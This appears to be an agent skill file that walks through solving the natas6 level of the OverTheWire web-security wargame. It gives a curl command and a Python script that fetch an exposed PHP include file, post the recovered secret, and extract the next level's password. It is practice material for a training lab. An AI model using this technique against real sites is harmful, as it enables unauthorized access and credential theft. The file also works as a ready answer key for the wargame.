---
name: natas-6
description: >-
  Use when solving OverTheWire natas6: given natas6 credentials, read
  includes/secret.inc, POST that secret to the form, and extract the natas7
  password.
---
# natas6

**Input:** username and password for natas6.

**Weakness:** the PHP includes `includes/secret.inc` for the shared secret, and that file is directly fetchable over HTTP. POST the secret to unlock the next password.

**Network:** run on a host that can reach `natas6.natas.labs.overthewire.org`. On Windows PowerShell use `python` / `curl.exe`, not the `curl` alias.

## Steps

1. Fetch the included secret:

```bash
curl.exe -s -u USER:PASS http://natas6.natas.labs.overthewire.org/includes/secret.inc
```

2. Derive the natas7 password by posting that secret (never hardcode either value). Save this as `solve.py` and run `python solve.py USER PASS`:

```python
#!/usr/bin/env python3
import base64, re, sys, urllib.parse, urllib.request
user, password = sys.argv[1], sys.argv[2]
auth = "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()
base = "http://natas6.natas.labs.overthewire.org"
def get(path):
    req = urllib.request.Request(base + path, headers={"Authorization": auth})
    return urllib.request.urlopen(req, timeout=30).read().decode()
secret = re.search(r'\$secret\s*=\s*"([^"]+)"', get("/includes/secret.inc")).group(1)
data = urllib.parse.urlencode({"secret": secret, "submit": "1"}).encode()
req = urllib.request.Request(base + "/", data=data, headers={"Authorization": auth})
html = urllib.request.urlopen(req, timeout=30).read().decode()
print(re.search(r"password for natas7 is ([A-Za-z0-9]+)", html).group(1))
```

3. The printed string is the natas7 password.

4. Confirm by GETting `http://natas7.natas.labs.overthewire.org/` with Basic Auth `natas7:<password>` and expecting HTTP 200.
